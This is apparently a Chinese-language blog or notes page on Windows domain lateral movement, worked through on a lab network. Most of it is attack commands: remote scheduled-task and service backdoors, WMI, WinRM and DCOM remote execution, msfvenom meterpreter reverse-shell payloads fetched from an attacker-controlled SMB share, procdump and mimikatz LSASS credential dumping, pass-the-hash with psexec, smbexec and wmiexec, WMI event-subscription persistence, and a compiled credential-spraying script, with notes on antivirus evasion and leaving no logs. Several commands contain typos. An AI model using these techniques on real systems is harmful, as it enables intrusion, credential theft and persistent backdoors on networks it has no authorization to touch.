<h6 id="at-lt-windows-2012"><a href="#at-lt-windows-2012" class="headerlink" title="at &lt; windows 2012"></a>at &lt; windows 2012</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301145843892.png"
                      alt="image-20230301145843892"
                ></p>
<p>首先利用信息收集工具收集到域控主机的地址信息，然后利用这个地址信息建立ipc连接，在利用已经攻陷的web服务器主机向域控主机复一个add.bat文件，该文件内容为创建一个用户（实际中一般植入病毒后门），再利用at定时自动执行在域上执行该文件，则就建立了一个用户schtasks &gt;&#x3D; windows 2012</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301150838876.png"
                      alt="image-20230301150838876"
                ></p>
<h6 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301152547387.png"
                      alt="image-20230301152547387"
                ></p>
<p>计划任务</p>
<p><code>schtasks /Create /S 192.168.30.30 /TN Backdoor /SC minute /MO 1 /TR C:\reverse_tcp.exe /RU System /F</code></p>
<p>立即执行</p>
<p><code>schtasks /RUN /S 192.168.30.30 /I /TN Backdoor</code></p>
<p>删除</p>
<p><code>schtasks /Delete /S 192.168.30.30 /TN Backdoor /F</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#也可以通过将命令的文件写入文件，通过type命令读取</span><br><span class="line">schtasks /Create /S 19.168.30.30 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami&#x27; &gt; C:\resulit.txt&quot; /RU System /f</span><br><span class="line"></span><br><span class="line">type \\192.168.30.30\C$\result.txt     #读取执行结果</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h6 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h6><p>Windows可以利用UNC路径来访问网络共享资源</p>
<p>1.现在服务器中搭建SMB匿名共享服务，并生成攻击载荷放入共享目录</p>
<p>2.执行</p>
<p><code>schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\ evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</code></p>
<p>在远程主机10.10.10.19中创建计划任务，使用UNC路径加载位于192.168.2.143共享中的攻击载荷并执行</p>
<h3 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h3><p>WMI是Windows管理技术，通过调用WMI类的方法进行远程执行</p>
<p>执行远程查询，查询远程主机的进程信息</p>
<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process li st brief</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174150555.png"
                      alt="image-20230317174150555"
                ></p>
<p>创建远程进程</p>
<p><code>wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 process call create &quot;cmd.exe /c ipconfig &gt; C:\jieguo.txt&quot;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174534828.png"
                      alt="image-20230317174534828"
                ></p>
<p>因为没有回显所以需要利用type进行查看</p>
<p><code>type \\192.168.30.10\C$\jieguo.txt</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317174549486.png"
                      alt="image-20230317174549486"
                ></p>
<p>还可以使用远程安装MSI文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用msf生成一个msi恶意文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 Lport=4444 -f msi -o reverse_tcp.msi</span><br><span class="line">建立共享服务器SMB</span><br><span class="line">在跳板机上执行</span><br><span class="line">wmic /node:192.168.30.10 /user:Administrator /password:Admin!@#45 priduct call install PackageLocation=&quot;\\SMB服务器IP\服务名\reverse_tcp.msi&quot;</span><br></pre></td></tr></table></figure></div>

<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="winRM的利用"><a href="#winRM的利用" class="headerlink" title="winRM的利用"></a>winRM的利用</h3><p>通过winRM执行远程命令</p>
<p>执行以下命令，手动将目的IP添加到客户端信任列表TrustedHosts</p>
<p><code>winrm set winrm/config/client @&#123;TrustedHosts=&quot;192.168.30.10&quot;&#125;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317220135483.png"
                      alt="image-20230317220135483"
                ></p>
<p><code>Set-Item WSMan:localhost\client\trustedhosts -value *</code></p>
<p>上面这个命令是在powershell上面执行的</p>
<h6 id="winrs"><a href="#winrs" class="headerlink" title="winrs"></a>winrs</h6><p>Winrm是Windows远程管理的客户端程序，允许通过提供的用户凭据，在winRM服务器上执行命令</p>
<p>在远程主机上执行<code>winrs -r http://192.168.30.10:5985 -u:Administrator -p:Admin!@#45 &quot;whoami&quot;</code></p>
<p>也可以直接在上面whoami的位置输入cmd打开cmd</p>
<h6 id="Winrm-cmd"><a href="#Winrm-cmd" class="headerlink" title="Winrm.cmd"></a>Winrm.cmd</h6><p>Winrm.cmd允许WMI对象通过WinRM传输进行远程交互</p>
<h3 id="系统服务利用"><a href="#系统服务利用" class="headerlink" title="系统服务利用"></a>系统服务利用</h3><h4 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h4><p>先建立ipc共享</p>
<p>然后<code>sc \\192.168.30.30 create Backdoor binpath= &quot;cmd.exe /k C:\rever_tcp.exe&quot;</code></p>
<p>注意&#x3D;后面要有空格</p>
<p>执行<code>sc \\192.168.30.30 start Backdoor</code></p>
<p>删除服务<code>sc \\192.168.30.30 delete Backdoor</code></p>
<h4 id="利用全部步骤："><a href="#利用全部步骤：" class="headerlink" title="利用全部步骤："></a>利用全部步骤：</h4><p>先利用信息收集部分的指令得到该域内各个主机的地址信息等</p>
<p>for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”  检测存活ip</p>
<p>再利用mimikatz获取已控制主机的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154749779.png"
                      alt="image-20230301154749779"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301154815697.png"
                      alt="image-20230301154815697"
                ></p>
<p>然后利用批量impacket脚本批量探测，再找到另外一个主机一样的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301161036660.png"
                      alt="image-20230301161036660"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230301155730960.png"
                      alt="image-20230301155730960"
                ></p>
<p>发现有一个具有system权限，说明该主机有跟本主机一样的密码，</p>
<p>所以可以在现在发现的这个主机上再次使用mimikatz找新的密码，然后以此类推用这个密码再次探测各个主机地址</p>
<p>直到找到域控密码</p>
<p>得到密码之后就可以利用at或者schtasks进行攻击，至此完整过程完成</p>
<h4 id="psexec-amp-smbexec以及wmic-amp-wmiexec"><a href="#psexec-amp-smbexec以及wmic-amp-wmiexec" class="headerlink" title="psexec&amp;smbexec以及wmic&amp;wmiexec"></a>psexec&amp;smbexec以及wmic&amp;wmiexec</h4><p>前瞻知识：</p>
<p>1.windows2012之后系统默认关闭wigest，攻击者无法从内存中获取明文密码，2012之前的版本如果安装KB2871997补丁。也会导致这样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302091720681.png"
                      alt="image-20230302091720681"
                ></p>
<h5 id="procdump-mimikatz的配合获取"><a href="#procdump-mimikatz的配合获取" class="headerlink" title="procdump+mimikatz的配合获取"></a>procdump+mimikatz的配合获取</h5><p>procdump -accepteula -ma lsass.exe lsass.dmp  </p>
<p>   #在目标主机上执行该条命令，得到了lsass.dmp文件，之后就是将这个文件移动到我们的本地主机，使用mimikatz进行恢复</p>
<p>然后在mimikatz上执行</p>
<p>privilege::debug</p>
<p>sekurlsa::minidump lsass.dmp </p>
<p>sekurlsa::logonpasswords full</p>
<p>原理：Mimikatz属于第三方软件，直接上传到目标主机可能 杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
<h5 id="hashcat破解NTLM-hash-kali系统自带"><a href="#hashcat破解NTLM-hash-kali系统自带" class="headerlink" title="hashcat破解NTLM hash(kali系统自带)"></a>hashcat破解NTLM hash(kali系统自带)</h5><p>—爆破命令：hashcat -a 0 -m 1000 hash file –force</p>
<p>—-a, –attack-mode&#x3D;NUM         攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。（这里是字典攻击）</p>
<p>— -m 1000指向的是NTLM Hash哈希协议</p>
<p>—hash是要破解的哈希字符串，file为字典的地址</p>
<h5 id="域横向移动smb服务利用–psexec，，smbexec（官方自带）"><a href="#域横向移动smb服务利用–psexec，，smbexec（官方自带）" class="headerlink" title="域横向移动smb服务利用–psexec，，smbexec（官方自带）"></a>域横向移动smb服务利用–psexec，，smbexec（官方自带）</h5><p>利用smb服务可以通过明文或者hash传递来远程执行，必要条件是445端口要开启和Admin$共享</p>
<p>主要连接到SMB服务端的Admin$共享，并且释放psexesvc.exe，注册PSEXESVC服务，然后通过PSEXESVC服务进行命令执行</p>
<p>简要来说就是用这些工具来远程得到目标主机的system权限</p>
<h6 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h6><p>存在两种连接方式：</p>
<ol>
<li>先有 ipc 链接，psexec 需要明文或hash 传递</li>
</ol>
<p>先建立ipc连接：<code>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator（密码是前期信息收集获取）</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/61ebf51eba2c47386868d4c0c3ad5be5aab0cadb.png@831w_224h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>—以system权限运行cmd: psexec \192.168.3.32 -s cmd（发现为系统权限）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/81503bc903d891f81ae6212759bd1e9c9ece321a.png@824w_354h_progressive.webp"
                      alt="img"
                ></p>
<p>2.不用建立IPC直接提供明文账户密码（推荐原因：建立IPC链接可能会失败）</p>
<p><code>psexec --accepteula \\192.168.3.21 -u（用户） administrator -p（密码） Admin12345 -s（系统权限） cmd（运行cmd） </code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9695a079ec035707a26619612833bd79c3a062e8.png@831w_246h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >



<p>如果没有明文密码，只有hash密码的话官方的pstools不能使用，这时候就需要使用impacket中别人二改的psexec.exe</p>
<p>psexec.exe -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#51;&#x32;" >&#97;&#100;&#x6d;&#x69;&#x6e;&#105;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#51;&#x2e;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<h6 id="smbexec（无需先ipc连接-明文传递）"><a href="#smbexec（无需先ipc连接-明文传递）" class="headerlink" title="smbexec（无需先ipc连接 明文传递）"></a>smbexec（无需先ipc连接 明文传递）</h6><p>连接sqlserver的非域内主机</p>
<p>smbexec .&#x2F;administrator:admin!@#45  @192.168.3.32 </p>
<p>链接sqlserver的域内用户</p>
<p>smbexec .god&#x2F;administrator:Admin12345  @192.168.3.32</p>
<p>建立哈希连接（sqlserver的非域管理员）：</p>
<p>smbexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;administrator  @192.168.3.32 </p>
<p>通过域用户中域管理员登陆sqlserver服务器（域管理员可以登陆域内任意主机）</p>
<p>smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#x32;" >&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#51;&#x2e;&#51;&#x32; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h6 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h6><p>使用命令</p>
<p><code>wmiexec HACK-MY/Administrator:Admin!@#45@192.168.30.10</code>连接域内主机，就可以远程命令控制</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230317202047275.png"
                      alt="image-20230317202047275"
                ></p>
<h5 id="域横向移动WMI服务利用"><a href="#域横向移动WMI服务利用" class="headerlink" title="域横向移动WMI服务利用"></a>域横向移动WMI服务利用</h5><p>WMI是一种Windows管理规范可以通过WMI管理本地用户和远程计算机，提供两个协议分布式组件对象模型、Windows远程管理</p>
<p>WMI服务是通过本地135端口进行利用的，支持用户名明文或者哈希的方式进行认证，并且该方法不会在目标日志系统留下痕迹</p>
<p>常见的控制方法有</p>
<p>1.通过调用WMI的类的方法进行远程执行如Win32_Process类中的Create方法可以远程主机上创建进程，利用install安装恶意MSI</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用metasploit生成恶意的MSI</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -F MSI -O reverse_tcp.msi</span><br><span class="line">服务器上搭建SMB共享服务器，并放入msi</span><br><span class="line">跳板机上执行</span><br><span class="line">wmic /node:101.10.10.19 /user:Administrator /password:Admin@123 product call install packageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;</span><br><span class="line">成功获取权限</span><br></pre></td></tr></table></figure></div>



<p>2.远程部署WMI实践订阅，条件触发攻击</p>
<p>1.自带WMIC明文传递 无回显</p>
<p>wmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Admin12345 process call create “cmd.exe &#x2F;c ipconfig &gt;C:\1.txt”</p>
<p>2.自带cscript明文传递，有回显（需要wmiexec.vbs文件，不支持hash）</p>
<p>cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.3.21 administrator Admin12345 </p>
<p>3.impacket wmiexec套件，明文传递，支持hash，有回显，但是得做免杀</p>
<p>连接域sqlserver执行命令：</p>
<p>wmiexec .&#x2F;administrator:admin!@#45    @192.168.3.32 “whoami”（或者”ipconfig”） </p>
<p>明文连接域控：</p>
<p>wmiexec god&#x2F;administrator:Admin12345    @192.168.3.21 “whoami”</p>
<p>哈希分别连接sqlserver和域控</p>
<p>wmiexec -hashes :518b98ad4178a53695dc997aa02d455c .&#x2F;<a class="link"   href="mailto:&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x33;&#46;&#x33;&#50;" >&#97;&#100;&#109;&#105;&#110;&#x69;&#x73;&#116;&#x72;&#x61;&#116;&#111;&#114;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#46;&#x33;&#46;&#x33;&#50; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
<p>wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god&#x2F;<a class="link"   href="mailto:&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x2e;&#x32;&#49;" >&#97;&#x64;&#109;&#105;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x2e;&#x32;&#49; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> “whoami”</p>
<h6 id="WMI订阅事件"><a href="#WMI订阅事件" class="headerlink" title="WMI订阅事件"></a>WMI订阅事件</h6><p>相当于一个条件触发事件，其中条件被称为“事件过滤器”，做出的响应称为“事件消费者”</p>
<p>部署事件订阅的时候，需要分别构建Filter以及Consumer，且绑定一起</p>
<p>手动利用</p>
<p>1.整合PSCredential用于后续过程的认证</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Username= &quot;HACK-MY\Administrator&quot;</span><br><span class="line">$Password=&quot;Admin!@#45&quot;</span><br><span class="line">$SecurePassword= $Password | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="line">$Credential = New-Object -Typename Syetem.Management.Automation.PSCredential -ArgumentList $Username,$SecurePassword</span><br></pre></td></tr></table></figure></div>

<p>2.设置攻击目标和其他公共参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GlobalArgs = @&#123;&#125;</span><br><span class="line">$ComputerName =&quot;192.168.30.10&quot;</span><br><span class="line">$GlobalArgs[&#x27;Credential&#x27;] = $Credential</span><br><span class="line">$GlobalArgs[&#x27;ComputerName&#x27;] = $ComputerName</span><br></pre></td></tr></table></figure></div>

<p>3.在远程主机上部署RestFilter</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$EventFilterArgs = @&#123;</span><br><span class="line">       EventNamespace = &#x27;root/cimv2&#x27;</span><br><span class="line">       Name = &quot;TestFilter&quot;</span><br><span class="line">       Ouery = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;</span><br><span class="line">       QueryLanguage =&#x27;WQL&#x27;</span><br><span class="line">             &#125;</span><br><span class="line">$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>4.在远程主机部署一个叫“TestConsumer”的事件消费者</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$CommandLineEventConsumerArgs =@&#123;</span><br><span class="line">          Name =&quot;TestConsumer&quot;</span><br><span class="line">          CommandLineTemplate =&quot;C:\Windows\System32\cmd.exe /c calc.exe&quot;</span><br><span class="line">                                &#125;</span><br><span class="line">$EventConsumer = Set-WmiInstance -Namespace root \subscription -Class</span><br><span class="line">    CommandLineEventConsumer -Arguments $CommandLineEventConsumerArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>5.将事件消费者和事件过滤器绑定一起</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$FilterConsumerBindingArgs= &#123;</span><br><span class="line">      Filter = $EventFilter</span><br><span class="line">      Consumer = $EventConsumer</span><br><span class="line">                            &#125;</span><br><span class="line">$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class</span><br><span class="line">    __FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs</span><br></pre></td></tr></table></figure></div>

<p>如此一个事件订阅已经部署了，当远程系统轮询到svchost.exe进程产生时，将通过事件消费者执行系统命令来启动cale.exe进程</p>
<p>Sharp-WMIEvent利用</p>
<p>1.先在smb共享服务器上放入攻击载荷</p>
<p>2.在跳板机上执行以下命令，运行Sharp-WMIEvent</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -CommputerName 192.168.30.10 -Domain hack-my.com -Username Administrator -Password Admin!@#45 -Command &quot;cmd.exe / c \\SMB服务器IP\evilsmb服务名称\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure></div>

<p> 这会在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行以此攻击载荷，使远程主机上线</p>
<h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><p>1.信息收集，mimikatz实现密码收集</p>
<p>2.使用命令检测存活ip     for &#x2F;L %I in (1,1,254) Do @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”     并排除自己本机的IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302112713483.png"
                      alt="image-20230302112713483"
                ></p>
<p>然后收集域用户信息</p>
<p>3.通过ipc等连接来验证域内主机的用户和密码</p>
<p>4.通过命令或者工具箱进行提权</p>
<p>5.重复进行操作，直到获取域控的权限</p>
<h5 id="域横向移动以上服务hash批量利用-python编译exe"><a href="#域横向移动以上服务hash批量利用-python编译exe" class="headerlink" title="域横向移动以上服务hash批量利用-python编译exe"></a>域横向移动以上服务hash批量利用-python编译exe</h5><p>—收集明文或哈希密码（这个是Web本地用户）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c254c9e8488c3621f704255c4119d978a5398b34.png@783w_288h_progressive.webp"
                      alt="img"
                ></p>
<p>—探测同网段存活主机</p>
<p>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”（用for循环去ping1-254网段的主机，这是自带内部命令，不会被杀毒软件拦截，我这里只开了DC&#x2F;WEB&#x2F;SQL&#x2F;File）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/a32f6cd76d5f7ee9d05348ab3ca8f1d622c0978c.png@831w_87h_progressive.webp"
                      alt="img"
                ></p>
<p>—探测域内用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b19abce24e85642feee983b541402857a2f72f1c.png@831w_408h_progressive.webp"
                      alt="img"
                ></p>
<p>#至此，我们已经收集到了IP，用户名，和密码hash。我们可以写一个python脚本，然后转换成exe批量利用</p>
<p>—写入ip字典，用户字典，哈希密码字典</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/cfa491a8137591a7437af3f5eb8c7b177b994d25.png@597w_527h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>—ip、用户、哈希密码三重变化，连接域用户和本地用户</p>
<p>—采用套件impacket包中，wmiexec明文或hash传递，有回显exe版本，但是易被杀（要做免杀）（这里注意whoami前面有空格）</p>
<p>—并且该方法不会在目标日志系统留下痕迹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/0e2b7e27c57a91b1367529f3ab5d0727aa245468.png@831w_371h_progressive.webp"
                      alt="img"
                ></p>
<p>—将Python脚本复制到Script目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1d73721d1e18e01d245ad03070eb2cc5865f81c4.png@813w_209h_progressive.webp"
                      alt="img"
                ></p>
<p>—在Script目录执行命令：pyinstaller.exe -F fuck_neiwang_002.py</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/838ea2110e71032e60b3fd71e1e729bcad2256e3.png@831w_252h_progressive.webp"
                      alt="img"
                ></p>
<p>—在Script目录下dist目录发现exe文件，复制到域Web靶机执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/308612a5f913f9ea1cee905ff22db757ddf83d96.png@831w_234h_progressive.webp"
                      alt="img"
                ></p>
<p>—运行exe文件，注意要和impacket包中wmiexec.exe文件同路径</p>
<p>—发现192.168.3.32的本地管理员用户（Administrator）和字典的哈希密码一致</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/15d8f700dd18d364be7f668e7db63bd273d42146.png@831w_129h_progressive.webp"
                      alt="img"
                ></p>
<p>—在192.168.3.32主机运行minikatz，获取到一个新的密码hash（第一个是连接的，第二个是新获取的，假设只找到了hash）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/6cb861791e073abaf6e6aecac1036b3c8f68c756.png@831w_336h_progressive.webp"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/091c2301d888752e9bb70dcf4c48182ec8a712a8.png@831w_266h_progressive.webp"
                      alt="img"
                ></p>
<p>—但是查看域用户发现没有这个sqlserver的用户</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1331e4aed28b4e607714d79bd8634b54fdb5224f.png@831w_306h_progressive.webp"
                      alt="img"
                ></p>
<p>—在sqlserver本地查看，也没有sqlserver用户，由于是连接的本地用户，所以盲猜是本地用户的一个哈希密码，但是不知道是以下哪一个。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d610ad1369fe1a88ccf868c2db805d4ba1dbb403.png@735w_236h_progressive.webp"
                      alt="img"
                ></p>
<p>—不知道为啥SQL的主机的域dbadmin用户没连接上，他俩的密码都是一样的，按道理本地连接上了域用户也可以才对</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4779e1676f6086f5e8a9a99ca3b76ec0a061dc08.png@831w_108h_progressive.webp"
                      alt="img"
                ></p>
<p>—通过在sqlserver上获取的密码和用户账户，添加到Python脚本的字典里面，那么能够获取的域内用户的哈希密码越来越多</p>
<p>—这里一般都获取到域内主机的本地用户的密码，我猜测通过这些哈希密码字典去爆破域控。因为即使获取到域内用户的正确密码，但是没有域管理员权限是无法通过mimikatz获取内存的密码。</p>
<p>—但是即使如此，我们可以通过搜集域内用户的凭据信息来丰富明文和哈希字典</p>
<h4 id="域横向COM和DCOM"><a href="#域横向COM和DCOM" class="headerlink" title="域横向COM和DCOM"></a>域横向COM和DCOM</h4><h6 id="1-COM"><a href="#1-COM" class="headerlink" title="1. COM"></a>1. COM</h6><p>com是微软的一套软件组件的二进制接口标准，使跨编程语言的进程间通信、动态对象创建成为可能</p>
<h6 id="2-DCOM"><a href="#2-DCOM" class="headerlink" title="2. DCOM"></a>2. DCOM</h6><p>DCOM 是基于组件对象模型的一系列概念和程序接口，支持不同机器上的组件间的通信。利用DCOM，客户端程序能够请求来自网络中另一台计算机上的服务器程序对象</p>
<h5 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h5><p>可以使用<code>Get-CimInstance win32_dcomapplication</code>这个命令列出计算机上所有的DCOM组件</p>
<h6 id="1-MMC20-Application"><a href="#1-MMC20-Application" class="headerlink" title="1.MMC20.Application"></a>1.MMC20.Application</h6><p>利用MMC20.Application组件在远程主机上执行攻击荷载，并上线meterpreper</p>
<ol>
<li><p>在一台可控服务器上搭建smb匿名共享服务，并将生成发攻击荷载放入共享目录。</p>
</li>
<li><p>在管理员权限的powershell中执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象的实例</span><br><span class="line">$com=[activator]::createinstance([type]::GetTypeFromProID(&quot;MMC20.Application&quot;,&quot;10.10.10.19&quot;))</span><br><span class="line">调用ExecuteShellCommond方法启动进程，以运行攻击载荷</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommond(&#x27;cmd.exe&#x27;,$null,&quot;/c\\192.168.2.134\evilsmb&quot;)</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>2.ShellWindows</p>
